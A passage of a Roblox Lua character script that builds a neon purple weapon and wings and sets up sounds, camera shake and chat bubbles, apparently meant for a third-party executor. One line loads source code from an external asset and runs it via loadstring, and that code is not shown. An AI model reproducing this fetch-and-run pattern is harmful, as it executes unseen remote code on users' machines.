Part459.Anchored = true
Part459.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part459.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part459.BrickColor = BrickColor.new("Royal purple")
Part459.CanCollide = false
Part459.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part459.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part459.Material = Enum.Material.Neon
Part459.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part459.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part459.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part459.brickColor = BrickColor.new("Royal purple")
SpecialMesh460.Parent = Part459
SpecialMesh460.Scale = Vector3.new(0.524999976, 1.04999995, 0.800000012)
SpecialMesh460.MeshType = Enum.MeshType.Brick
Part461.Parent = Model0
Part461.CFrame = CFrame.new(-0.605971158, 3.45052385, -18.8064079, -0.999985635, 0.00474059395, 0.00250087585, -0.00513641909, -0.714288056, -0.699833155, -0.00153127871, -0.699835896, 0.714302182)
Part461.Orientation = Vector3.new(44.4099998, 0.199999988, -179.589996)
Part461.Position = Vector3.new(-0.605971158, 3.45052385, -18.8064079)
Part461.Rotation = Vector3.new(44.4099998, 0.140000001, -179.729996)
Part461.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part461.Velocity = Vector3.new(2.51790748e-08, 0.00245686295, 3.30880596e-07)
Part461.Size = Vector3.new(0.275000006, 0.235124931, 0.586375237)
Part461.Anchored = true
Part461.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part461.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part461.BrickColor = BrickColor.new("Really black")
Part461.CanCollide = false
Part461.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part461.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part461.Material = Enum.Material.Metal
Part461.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part461.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part461.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part461.brickColor = BrickColor.new("Really black")
SpecialMesh462.Parent = Part461
SpecialMesh462.Scale = Vector3.new(0.400000006, 1.04999995, 1)
SpecialMesh462.MeshType = Enum.MeshType.Brick
Part463.Parent = Model0
Part463.CFrame = CFrame.new(-0.610880256, 2.96906447, -13.9840736, -0.999985635, -0.00162807154, -0.00510650687, -0.00513644237, 0.0189459547, 0.999807417, -0.00153100991, 0.999819279, -0.0189540461)
Part463.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part463.Position = Vector3.new(-0.610880256, 2.96906447, -13.9840736)
Part463.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part463.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part463.Velocity = Vector3.new(1.01522062e-07, 0.00246691052, 1.33410845e-06)
Part463.Size = Vector3.new(0.275000006, 0.239124984, 0.303375006)
Part463.Anchored = true
Part463.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part463.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part463.BrickColor = BrickColor.new("Really black")
Part463.CanCollide = false
Part463.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part463.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part463.Material = Enum.Material.Glass
Part463.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part463.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part463.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part463.brickColor = BrickColor.new("Really black")
SpecialMesh464.Parent = Part463
SpecialMesh464.Scale = Vector3.new(0.524999976, 1, 1)
SpecialMesh464.MeshType = Enum.MeshType.Brick
Part465.Parent = Model0
Part465.CFrame = CFrame.new(-0.63922745, 2.59812379, -14.6365376, -0.00114342954, -0.999985635, -0.00523668341, 0.483495861, -0.00513675157, 0.8753317, -0.875346065, -0.00153103401, 0.483494759)
Part465.Orientation = Vector3.new(-61.079998, -0.620000005, 90.6100006)
Part465.Position = Vector3.new(-0.63922745, 2.59812379, -14.6365376)
Part465.Rotation = Vector3.new(-61.0900002, -0.299999982, 90.0699997)
Part465.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part465.Velocity = Vector3.new(1.6034052e-07, 0.0024655466, 2.10704593e-06)
Part465.Size = Vector3.new(0.423000038, 0.200000003, 0.280375004)
Part465.Anchored = true
Part465.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part465.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part465.BrickColor = BrickColor.new("Royal purple")
Part465.CanCollide = false
Part465.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part465.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part465.Material = Enum.Material.Neon
Part465.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part465.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part465.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part465.brickColor = BrickColor.new("Royal purple")
SpecialMesh466.Parent = Part465
SpecialMesh466.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh466.MeshType = Enum.MeshType.Wedge
Part467.Parent = Model0
Part467.CFrame = CFrame.new(-0.63986814, 2.78907037, -14.8587627, -0.0036113495, -0.999985635, -0.00396139733, 0.85638535, -0.00513809687, 0.516312063, -0.516324997, -0.0015278986, 0.856391549)
Part467.Orientation = Vector3.new(-31.0900002, -0.269999981, 90.3399963)
Part467.Position = Vector3.new(-0.63986814, 2.78907037, -14.8587627)
Part467.Rotation = Vector3.new(-31.0900002, -0.229999989, 90.2099991)
Part467.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part467.Velocity = Vector3.new(1.30062929e-07, 0.00246508326, 1.70916621e-06)
Part467.Size = Vector3.new(0.293000042, 0.200000003, 0.280375004)
Part467.Anchored = true
Part467.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part467.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part467.BrickColor = BrickColor.new("Royal purple")
Part467.CanCollide = false
Part467.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part467.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part467.Material = Enum.Material.Neon
Part467.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part467.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part467.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part467.brickColor = BrickColor.new("Royal purple")
SpecialMesh468.Parent = Part467
SpecialMesh468.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh468.MeshType = Enum.MeshType.Wedge
Part469.Parent = Model0
Part469.CFrame = CFrame.new(-0.610184669, 2.95239902, -14.3818283, 0.999985635, 0.00162795268, -0.00510686403, 0.0051367972, -0.0189460143, 0.999807417, 0.00153088395, -0.999819279, -0.0189541057)
Part469.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part469.Position = Vector3.new(-0.610184669, 2.95239902, -14.3818283)
Part469.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part469.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part469.Velocity = Vector3.new(1.04164627e-07, 0.00246608187, 1.36883455e-06)
Part469.Size = Vector3.new(0.275000006, 0.410999984, 0.469375014)
Part469.Anchored = true
Part469.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part469.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part469.BrickColor = BrickColor.new("Really black")
Part469.CanCollide = false
Part469.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part469.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part469.Material = Enum.Material.Glass
Part469.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part469.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part469.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part469.brickColor = BrickColor.new("Really black")
SpecialMesh470.Parent = Part469
SpecialMesh470.Scale = Vector3.new(0.5, 0.850000024, 0.699999988)
SpecialMesh470.MeshType = Enum.MeshType.Brick
Part471.Parent = Model0
Part471.CFrame = CFrame.new(-0.613238811, 3.32843637, -13.6493177, -0.999985635, -0.00162807142, -0.00510653527, -0.00513647031, 0.0189459249, 0.999807417, -0.00153100933, 0.999819279, -0.0189540163)
Part471.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part471.Position = Vector3.new(-0.613238811, 3.32843637, -13.6493177)
Part471.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part471.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part471.Velocity = Vector3.new(4.45380195e-08, 0.00246760761, 5.85277007e-07)
Part471.Size = Vector3.new(0.275000006, 0.698124886, 0.638374984)
Part471.Anchored = true
Part471.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part471.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part471.BrickColor = BrickColor.new("Really black")
Part471.CanCollide = false
Part471.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part471.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part471.Material = Enum.Material.Glass
Part471.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part471.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part471.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part471.brickColor = BrickColor.new("Really black")
SpecialMesh472.Parent = Part471
SpecialMesh472.Scale = Vector3.new(0.449999988, 1, 1)
SpecialMesh472.MeshType = Enum.MeshType.Cylinder
Part473.Parent = Model0
Part473.CFrame = CFrame.new(-0.618369102, 3.23987865, -11.0925436, 0.999985635, 0.00162807235, -0.00510680024, 0.0051367362, -0.0189461038, 0.999807417, 0.00153100432, -0.999819279, -0.0189541951)
Part473.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part473.Position = Vector3.new(-0.618369102, 3.23987865, -11.0925436)
Part473.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part473.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part473.Velocity = Vector3.new(5.85802624e-08, 0.00247293455, 7.69806775e-07)
Part473.Size = Vector3.new(0.25999999, 0.578125, 0.21875)
Part473.Anchored = true
Part473.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part473.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part473.BrickColor = BrickColor.new("Really black")
Part473.CanCollide = false
Part473.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part473.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part473.Material = Enum.Material.Metal
Part473.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part473.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part473.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part473.brickColor = BrickColor.new("Really black")
SpecialMesh474.Parent = Part473
SpecialMesh474.Scale = Vector3.new(0.300000012, 1, 1)
SpecialMesh474.MeshType = Enum.MeshType.Wedge
Part475.Name = "TrueHandle"
Part475.Parent = Model0
Part475.CFrame = CFrame.new(-0.615642607, 3.34541011, -12.1349049, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part475.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part475.Position = Vector3.new(-0.615642607, 3.34541011, -12.1349049)
Part475.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part475.Color = Color3.new(0.803922, 0.803922, 0.803922)
Part475.Velocity = Vector3.new(4.18465866e-08, 0.00247076293, 5.49908464e-07)
Part475.Size = Vector3.new(0.275000006, 1.73512506, 0.280375004)
Part475.Anchored = true
Part475.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part475.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part475.BrickColor = BrickColor.new("Mid gray")
Part475.CanCollide = false
Part475.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part475.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part475.Material = Enum.Material.Metal
Part475.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part475.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part475.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part475.brickColor = BrickColor.new("Mid gray")
SpecialMesh476.Parent = Part475
SpecialMesh476.Scale = Vector3.new(0.349999994, 1.04999995, 0.5)
SpecialMesh476.MeshType = Enum.MeshType.Brick
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.Character
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
for i,v in pairs(Model0:GetChildren()) do
	if v:IsA("Part") then
        v.Locked = true
		v.Anchored = false
        v.CanCollide = false
	end
end
if not OldModel then
	Model0:Destroy()
end

plr = game:GetService("Players").LocalPlayer
char = playerss
hum = char.Humanoid
local cam = game.Workspace.CurrentCamera
t = char.Torso
h = char.Head
ra = char["Right Arm"]
la = char["Left Arm"]
rl = char["Right Leg"]
ll = char["Left Leg"]
tors = char.Torso
lleg = char["Left Leg"]
root = char.HumanoidRootPart
hed = char.Head
rleg = char["Right Leg"]
rarm = char["Right Arm"]
larm = char["Left Arm"]
it = Instance.new
vt = Vector3.new
bc = BrickColor.new
br = BrickColor.random
it = Instance.new
cf = CFrame.new
ceuler = CFrame.fromEulerAnglesXYZ

local muter = false
local ORGID = 1873219898
local ORVOL = 1.15
local ORPIT = 1.01
local kan = Instance.new("Sound",char)
kan.Volume = 0
if not NoSound then
	kan.Volume = 1.15
end
kan.TimePosition = 0
kan.PlaybackSpeed = 1.01
kan.Pitch = 1.01
kan.SoundId = "rbxassetid://1873219898" --525289865,1873219898,381991270
kan.Name = "nepnepnep"
kan.Looped = true
kan:Play()

function CameraShake(Times, Power)
coroutine.resume(coroutine.create(function()
FV = Instance.new("BoolValue", Character)
FV.Name = "CameraShake"
for ShakeNum=1,Times do
swait()
local ef=Power
  if ef>=1 then
   Humanoid.CameraOffset = Vector3.new(math.random(-ef,ef),math.random(-ef,ef),math.random(-ef,ef))
  else
   ef=Power*10
   Humanoid.CameraOffset = Vector3.new(math.random(-ef,ef)/10,math.random(-ef,ef)/10,math.random(-ef,ef)/10)
  end	
end
Humanoid.CameraOffset = Vector3.new(0,0,0)
FV:Destroy()
end))
end

CamShake=function(Part,Distan,Power,Times) 
local de=Part.Position
for i,v in pairs(workspace:children()) do
 if v:IsA("Model") and v:findFirstChild("Humanoid") then
for _,c in pairs(v:children()) do
if c.ClassName=="Part" and (c.Position - de).magnitude < Distan then
local Noob=v.Humanoid
if Noob~=nil then
if Noob:FindFirstChild("CamShake")==nil then-- and Noob == Character then
--[[local ss=script.CamShake:clone()
ss.Parent=Noob
ss.Power.Value=Power
ss.Times.Value=Times
ss.Disabled=false]]
CameraShake(Times, Power)
end
end
end
end
end
end
end

function chatfunc(text,color,typet,font,timeex)
local chat = coroutine.wrap(function()
if Character:FindFirstChild("TalkingBillBoard")~= nil then
Character:FindFirstChild("TalkingBillBoard"):destroy()
end
local naeeym2 = Instance.new("BillboardGui",Character)
naeeym2.Size = UDim2.new(0,100,0,40)
naeeym2.StudsOffset = Vector3.new(0,3,0)
naeeym2.Adornee = Character.Head
naeeym2.Name = "TalkingBillBoard"
local tecks2 = Instance.new("TextLabel",naeeym2)
tecks2.BackgroundTransparency = 1
tecks2.BorderSizePixel = 0
tecks2.Text = ""
tecks2.Font = font
tecks2.TextSize = 30
tecks2.TextStrokeTransparency = 0
tecks2.TextColor3 = color
tecks2.TextStrokeColor3 = Color3.new(0,0,0)
tecks2.Size = UDim2.new(1,0,0.5,0)
local tecks3 = Instance.new("TextLabel",naeeym2)
tecks3.BackgroundTransparency = 1
tecks3.BorderSizePixel = 0
tecks3.Text = ""
tecks3.Font = font
tecks3.TextSize = 30
tecks3.TextStrokeTransparency = 0
if typet == "Inverted" then
tecks3.TextColor3 = Color3.new(0,0,0)
tecks3.TextStrokeColor3 = color
elseif typet == "Normal" then
tecks3.TextColor3 = color
tecks3.TextStrokeColor3 = Color3.new(0,0,0)
end
tecks3.Size = UDim2.new(1,0,0.5,0)
coroutine.resume(coroutine.create(function()
while true do
swait(1)
if chaosmode == true then
tecks2.TextColor3 = BrickColor.random().Color
tecks3.TextStrokeColor3 = BrickColor.random().Color
end
end
end))
for i = 0, 74*timeex do
swait()
tecks2.Text = text
tecks3.Text = text
end
local randomrot = math.random(1,2)
if randomrot == 1 then
for i = 1, 50 do
swait()
tecks2.Text = text
tecks3.Text = text
tecks2.TextStrokeTransparency = tecks2.TextStrokeTransparency +.04
tecks2.TextTransparency = tecks2.TextTransparency + .04
tecks3.TextStrokeTransparency = tecks2.TextStrokeTransparency +.04
tecks3.TextTransparency = tecks2.TextTransparency + .04
end
elseif randomrot == 2 then
	for i = 1, 50 do
swait()
tecks2.Text = text
tecks3.Text = text
tecks2.TextStrokeTransparency = tecks2.TextStrokeTransparency +.04
tecks2.TextTransparency = tecks2.TextTransparency + .04
tecks3.TextStrokeTransparency = tecks2.TextStrokeTransparency +.04
tecks3.TextTransparency = tecks2.TextTransparency + .04
end
end
naeeym2:Destroy()
end)
chat()
end

FELOADLIBRARY = {}
loadstring(game:GetObjects("rbxassetid://5209815302")[1].Source)()
local Create = FELOADLIBRARY.Create

CFuncs = {	
	["Part"] = {
		Create = function(Parent, Material, Reflectance, Transparency, BColor, Name, Size)
			local Part = Create("Part"){
				Parent = Parent,
				Reflectance = Reflectance,
				Transparency = Transparency,
				CanCollide = false,
				Locked = true,
				BrickColor = BrickColor.new(tostring(BColor)),
				Name = Name,
				Size = Size,
				Material = Material,
			}
			RemoveOutlines(Part)
			return Part
		end;
	};
	
	["Mesh"] = {
		Create = function(Mesh, Part, MeshType, MeshId, OffSet, Scale)
			local Msh = Create(Mesh){
				Parent = Part,
				Offset = OffSet,
				Scale = Scale,
			}
			if Mesh == "SpecialMesh" then
				Msh.MeshType = MeshType
				Msh.MeshId = MeshId
			end
			return Msh
		end;
	};
	
	["Mesh"] = {
		Create = function(Mesh, Part, MeshType, MeshId, OffSet, Scale)
			local Msh = Create(Mesh){
				Parent = Part,
				Offset = OffSet,
				Scale = Scale,
			}
			if Mesh == "SpecialMesh" then
				Msh.MeshType = MeshType
				Msh.MeshId = MeshId
			end
			return Msh
		end;
	};
	
	["Weld"] = {
		Create = function(Parent, Part0, Part1, C0, C1)
			local Weld = Create("Weld"){
				Parent = Parent,
				Part0 = Part0,
				Part1 = Part1,
				C0 = C0,
				C1 = C1,
			}
			return Weld
		end;
	};

	["Sound"] = {
		Create = function(id, par, vol, pit) 
			coroutine.resume(coroutine.create(function()
				local S = Create("Sound"){
					Volume = vol,
					Pitch = pit or 1,
					SoundId = id,
					Parent = par or workspace,
				}
				wait() 
				S:play() 
				game:GetService("Debris"):AddItem(S, 10)
			end))
		end;
	};

["LongSound"] = {
		Create = function(id, par, vol, pit) 
			coroutine.resume(coroutine.create(function()
				local S = Create("Sound"){
					Volume = vol,
					Pitch = pit or 1,
					SoundId = id,
					Parent = char,
				}
				wait() 
				S:play() 
				game:GetService("Debris"):AddItem(S, 30)
			end))
		end;
	};
	
	["ParticleEmitter"] = {
		Create = function(Parent, Color1, Color2, LightEmission, Size, Texture, Transparency, ZOffset, Accel, Drag, LockedToPart, VelocityInheritance, EmissionDirection, Enabled, LifeTime, Rate, Rotation, RotSpeed, Speed, VelocitySpread)
			local fp = Create("ParticleEmitter"){
				Parent = Parent,
				Color = ColorSequence.new(Color1, Color2),
				LightEmission = LightEmission,
				Size = Size,
				Texture = Texture,
				Transparency = Transparency,
				ZOffset = ZOffset,
				Acceleration = Accel,
				Drag = Drag,
				LockedToPart = LockedToPart,
				VelocityInheritance = VelocityInheritance,
				EmissionDirection = EmissionDirection,
				Enabled = Enabled,
				Lifetime = LifeTime,
				Rate = Rate,
				Rotation = Rotation,
				RotSpeed = RotSpeed,
				Speed = Speed,
				VelocitySpread = VelocitySpread,
			}
			return fp
		end;
	};

	CreateTemplate = {
	
	};
}



New = function(Object, Parent, Name, Data)
	local Object = Instance.new(Object)
	for Index, Value in pairs(Data or {}) do
		Object[Index] = Value
	end
	Object.Parent = Parent
	Object.Name = Name
	return Object
end
local m = Instance.new("Model",char)

function CreateParta(parent,transparency,reflectance,material,brickcolor)
local p = Instance.new("Part")
p.TopSurface = 0
p.BottomSurface = 0
p.Parent = parent
p.Size = Vector3.new(0.05,0.05,0.05)
p.Transparency = transparency
p.Reflectance = reflectance
p.CanCollide = false
p.Locked = true
p.BrickColor = brickcolor
p.Material = material
return p
end

function CreateMesh(parent,meshtype,x1,y1,z1)
local mesh = Instance.new("SpecialMesh",parent)
mesh.MeshType = meshtype
mesh.Scale = Vector3.new(x1*20,y1*20,z1*20)
return mesh
end

function CreateSpecialMesh(parent,meshid,x1,y1,z1)
local mesh = Instance.new("SpecialMesh",parent)
mesh.MeshType = "FileMesh"
mesh.MeshId = meshid
mesh.Scale = Vector3.new(x1,y1,z1)
return mesh
end


function CreateSpecialGlowMesh(parent,meshid,x1,y1,z1)
local mesh = Instance.new("SpecialMesh",parent)
mesh.MeshType = "FileMesh"
mesh.MeshId = meshid
mesh.TextureId = "http://www.roblox.com/asset/?id=269748808"
mesh.Scale = Vector3.new(x1,y1,z1)
mesh.VertexColor = Vector3.new(parent.BrickColor.r, parent.BrickColor.g, parent.BrickColor.b)
return mesh
end

function CreateWeld(parent,part0,part1,C1X,C1Y,C1Z,C1Xa,C1Ya,C1Za,C0X,C0Y,C0Z,C0Xa,C0Ya,C0Za)
local weld = Instance.new("Weld")
weld.Parent = parent
weld.Part0 = part0
weld.Part1 = part1
weld.C1 = CFrame.new(C1X,C1Y,C1Z)*CFrame.Angles(C1Xa,C1Ya,C1Za)
weld.C0 = CFrame.new(C0X,C0Y,C0Z)*CFrame.Angles(C0Xa,C0Ya,C0Za)
return weld
end




---- WEAPON OR STUFF
local rarmor = CreateParta(m,1,0,"SmoothPlastic",BrickColor.Random())
local weaponweld = CreateWeld(rarmor,tors,rarmor,-3,0,-0.5,math.rad(0),math.rad(0),math.rad(-40),0,0,0,math.rad(0),math.rad(0),math.rad(0))
local MainWeldS = CreateWeld(Part475,rarmor,Part475,0,0,0,math.rad(90),math.rad(90),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))
local A0 = Instance.new("Attachment",rarmor)
A0.Position = Vector3.new(-2.5,0.25,0)
local A1 = Instance.new("Attachment",rarmor)
A1.Position = Vector3.new(-7.5,0.4,0)
tl1 = Instance.new('Trail',rarmor)
tl1.Attachment0 = A0
tl1.Attachment1 = A1
tl1.Texture = "http://www.roblox.com/asset/?id=1978704853"
tl1.LightEmission = 1
tl1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0),NumberSequenceKeypoint.new(1, 1)})
tl1.Color = ColorSequence.new(BrickColor.new('Royal purple').Color)
tl1.Lifetime = 0.6
tl1.Enabled = false




--------------- WINGS
local mainpart = CreateParta(m,1,0,"SmoothPlastic",BrickColor.Random())
local mwingweld = CreateWeld(mainpart,tors,mainpart,0,-0.5,-0.75,math.rad(0),math.rad(0),math.rad(0),0,0,0,math.rad(0),math.rad(0),math.rad(0))

local wng1a = CreateParta(m,1,0,"Neon",BrickColor.new("Alder"))
CreateMesh(wng1a,"Wedge",0.1,4,4)
CreateWeld(wng1a,mainpart,wng1a,0,-2,-2.5,math.rad(0),math.rad(70),math.rad(5),0,0,0,math.rad(0),math.rad(0),math.rad(0))
local wng2a = CreateParta(m,1,0,"Neon",BrickColor.new("Alder"))
CreateMesh(wng2a,"Wedge",0.1,4,4)
CreateWeld(wng2a,mainpart,wng2a,0,-2,-2.5,math.rad(0),math.rad(-70),math.rad(-5),0,0,0,math.rad(0),math.rad(0),math.rad(0))
local wng1b = CreateParta(m,1,0,"Neon",BrickColor.new("Alder"))
CreateMesh(wng1b,"Wedge",0.1,1.5,3)
CreateWeld(wng1b,mainpart,wng1b,0,-1,-2.25,math.rad(180),math.rad(-110),math.rad(-5),0,0,0,math.rad(0),math.rad(0),math.rad(0))
local wng2b = CreateParta(m,1,0,"Neon",BrickColor.new("Alder"))
CreateMesh(wng2b,"Wedge",0.1,1.5,3)
CreateWeld(wng2b,mainpart,wng2b,0,-1,-2.25,math.rad(180),math.rad(110),math.rad(5),0,0,0,math.rad(0),math.rad(0),math.rad(0))
------


function lerp(object, newCFrame, alpha)
  return object:lerp(newCFrame, alpha)
end

function RemoveOutlines(part)
  part.TopSurface, part.BottomSurface, part.LeftSurface, part.RightSurface, part.FrontSurface, part.BackSurface = 10, 10, 10, 10, 10, 10
end
function CreatePart(Parent, Material, Reflectance, Transparency, BColor, Name, Size)
  local Part = Create("Part")({
    Parent = Parent,
    Reflectance = Reflectance,
    Transparency = Transparency,
    CanCollide = false,
    Locked = true,
    BrickColor = BrickColor.new(tostring(BColor)),
    Name = Name,
    Size = Size,
    Material = Material
  })
  Part.CustomPhysicalProperties = PhysicalProperties.new(0.001, 0.001, 0.001, 0.001, 0.001)
  RemoveOutlines(Part)
  return Part
end
function CreateMesh(Mesh, Part, MeshType, MeshId, OffSet, Scale)
  local Msh = Create(Mesh)({
    Parent = Part,
    Offset = OffSet,
    Scale = Scale
  })
  if Mesh == "SpecialMesh" then
    Msh.MeshType = MeshType
    Msh.MeshId = MeshId
  end
  return Msh
end
function CreateWeld(Parent, Part0, Part1, C0, C1)
  local Weld = Create("Weld")({
    Parent = Parent,
    Part0 = Part0,
    Part1 = Part1,
    C0 = C0,
    C1 = C1
  })
  return Weld
end

Player=game:GetService("Players").LocalPlayer
Character=playerss 
PlayerGui=Player.PlayerGui 
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head 
Humanoid=Character.Humanoid
m=Instance.new('Model',Character)
LeftArm=Character["Left Arm"] 
LeftLeg=Character["Left Leg"] 
RightArm=Character["Right Arm"] 
RightLeg=Character["Right Leg"] 
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim="Idle"
local Effects={}
local gun=false
local shoot=false
local sine = 0
local change = 1
player=nil 

mouse=Player:GetMouse()
--save shoulders 
RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
TorsoColor=Torso.BrickColor
function NoOutline(Part)
Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
player=Player 
ch=Character
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 

local Stats=Instance.new("BoolValue")
Stats.Name="Stats"
Stats.Parent=Character
local Atk=Instance.new("NumberValue")
Atk.Name="Damage"
Atk.Parent=Stats
Atk.Value=1
local Def=Instance.new("NumberValue")
Def.Name="Defense"
Def.Parent=Stats
Def.Value=1
local Speed=Instance.new("NumberValue")
Speed.Name="Speed"
Speed.Parent=Stats
Speed.Value=1
local Mvmt=Instance.new("NumberValue")
Mvmt.Name="Movement"
Mvmt.Parent=Stats
Mvmt.Value=1

local donum=0
 

function part(formfactor,parent,reflectance,transparency,brickcolor,name,size)
local fp=it("Part")
fp.formFactor=formfactor 
fp.Parent=parent
fp.Reflectance=reflectance
fp.Transparency=transparency
fp.CanCollide=false 
fp.Locked=true
fp.BrickColor=brickcolor
fp.Name=name
fp.Size=size
fp.Position=Torso.Position 
NoOutline(fp)
fp.Material="SmoothPlastic"
fp:BreakJoints()
return fp 
end 
 
function mesh(Mesh,part,meshtype,meshid,offset,scale)
local mesh=it(Mesh) 
mesh.Parent=part
if Mesh=="SpecialMesh" then
